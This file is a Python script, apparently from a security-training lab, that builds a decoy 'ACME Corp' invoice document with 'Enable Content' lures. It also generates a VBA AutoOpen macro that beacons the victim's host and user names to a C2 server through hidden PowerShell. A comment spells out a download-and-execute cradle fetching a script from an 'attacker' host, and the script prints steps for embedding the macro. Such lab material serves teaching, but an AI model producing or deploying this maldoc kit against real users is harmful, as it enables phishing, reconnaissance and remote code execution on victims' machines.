#!/usr/bin/env python3
"""
Creates a decoy Word document (invoice_Q4_2024.docx) and prints
the VBA macro code students examine during the lesson.

Usage: python3 tools/create_macro_doc.py
Output: payloads/invoice_Q4_2024.docx  +  payloads/macro_code.vba
"""

import os

OUT    = os.path.join(os.path.dirname(__file__), "..", "payloads")
C2_IP  = os.getenv("KALI_IP") or __import__("socket").gethostbyname(__import__("socket").gethostname())
C2_PORT = os.getenv("KALI_PORT", "8080")
os.makedirs(OUT, exist_ok=True)

VBA = f"""\
' ============================================================
' LAB DEMO MACRO  —  invoice_Q4_2024.docm
' AutoOpen fires the moment the victim enables macros.
' This version is BENIGN: opens Calculator + creates log file.
' In a real attack the shell command would download a payload.
' ============================================================

Sub AutoOpen()
    Call DropPayload
End Sub

Sub DropPayload()
    Dim host As String : host = Environ("COMPUTERNAME")
    Dim user As String : user = Environ("USERNAME")
    Dim tmp  As String : tmp  = Environ("TEMP")

    ' Stage 1 – proof of execution (benign)
    Shell "cmd.exe /c calc.exe", vbHide

    ' Stage 2 – artifact on disk
    Dim f As Integer : f = FreeFile
    Open tmp & "\\macro_ran.txt" For Output As #f
        Print #f, "macro executed at " & Now()
        Print #f, "host=" & host & "  user=" & user
    Close #f

    ' Stage 3 – beacon back to C2
    Dim ps As String
    ps = "powershell -nop -w hidden -c " & _
         """Invoke-WebRequest -Uri 'http://{C2_IP}:{C2_PORT}/beacon" & _
         "?macro=1&host=" & host & "&user=" & user & "' -UseBasicParsing"""
    Shell "cmd.exe /c " & ps, vbHide

    MsgBox "Document loaded. (Lab: check " & tmp & "\\macro_ran.txt)", _
           vbInformation, "Done"
End Sub

' ============================================================
' REAL-WORLD ONE-LINER (shown for awareness — do not run):
'
'   Shell "cmd.exe /c powershell -nop -w hidden -enc <base64>", vbHide
'
'   Where the base64 decodes to:
'   IEX(New-Object Net.WebClient).DownloadString('http://attacker/s2.ps1')
' ============================================================
"""

vba_path = os.path.join(OUT, "macro_code.vba")
with open(vba_path, "w") as f:
    f.write(VBA)
print(f"[✓] VBA code → {vba_path}")

try:
    from docx import Document
    from docx.shared import Pt
    from docx.enum.text import WD_ALIGN_PARAGRAPH

    doc = Document()
    doc.add_heading("ACME Corp — Invoice Q4-2024", 0).alignment = WD_ALIGN_PARAGRAPH.CENTER

    warn = doc.add_paragraph()
    r = warn.add_run("⚠  PROTECTED DOCUMENT  —  Click Enable Content to view.")
    r.bold = True
    r.font.size = Pt(12)
    warn.alignment = WD_ALIGN_PARAGRAPH.CENTER

    doc.add_paragraph()
    tbl = doc.add_table(rows=5, cols=2)
    tbl.style = "Table Grid"
    for i, (k, v) in enumerate([
        ("Invoice #",   "INV-2024-Q4-0892"),
        ("Date",        "November 15, 2024"),
        ("Due",         "December 31, 2024"),
        ("Amount",      "$47,250.00"),
        ("Pay via",     "Wire / ACH"),
    ]):
        tbl.rows[i].cells[0].text = k
        tbl.rows[i].cells[1].text = v

    doc.add_paragraph()
    doc.add_paragraph(
        "Enable macros to generate the payment authorisation form."
    ).runs[0].italic = True

    out_path = os.path.join(OUT, "invoice_Q4_2024.docx")
    doc.save(out_path)
    print(f"[✓] Decoy document → {out_path}")
    print("    Note: .docx shown here; live .docm with working VBA needs LibreOffice or Word.")

except ImportError:
    print("[!] pip3 install python-docx")

print()
print("How to embed the macro in Word (on Windows victim — demo step):")
print("  1. Open invoice_Q4_2024.docx in Word")
print("  2. Alt+F11 → VBA editor → ThisDocument")
print("  3. Paste macro_code.vba")
print("  4. File → Save As → .docm")
print("  5. Reopen — click Enable Content")
